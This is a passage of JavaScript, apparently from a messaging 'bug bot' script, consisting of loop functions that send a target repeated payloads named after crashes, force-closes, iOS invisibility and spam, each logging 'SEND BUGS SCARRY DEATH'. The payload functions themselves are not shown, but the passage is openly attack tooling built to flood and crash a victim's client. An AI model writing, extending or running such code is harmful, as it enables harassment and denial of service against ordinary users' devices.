    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp3(target) {
    for (let i = 0; i < 50; i++) {
    await bulldozerDelay2GBnj(target);
    await delayMsg1GBnvv(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp4(target) {
    for (let i = 0; i < 2; i++) {
    await jjbymaklo(target);
    await DelayHardV9(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp5(target) {
    for (let i = 0; i < 2; i++) {
    await jjbymaklo(target);
    await DelayHardV9(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp6(target) {
    for (let i = 0; i < 40; i++) {
    await FcDelayV1ByMia(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp7(target) {
    for (let i = 0; i < 40; i++) {
    await FcDelayV1ByMia(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }


async function raraaimupp8(target) {
    for (let i = 0; i < 15; i++) {
    await iosinVisFC3(target);
    await new Promise((res) => setTimeout(res, 6000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp9(target) {
    for (let i = 0; i < 15; i++) {
    await iosinVisFC3(target);
    await new Promise((res) => setTimeout(res, 6000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function raraaimupp10(target) {
    for (let i = 0; i < 2; i++) {
    await jjbymaklo(target);
    await DelayHardV9(target)
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }

async function bugvvip(target) {
    for (let i = 0; i < 50; i++) {
    await BebasSpamyou(target);
    await new Promise((res) => setTimeout(res, 1000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
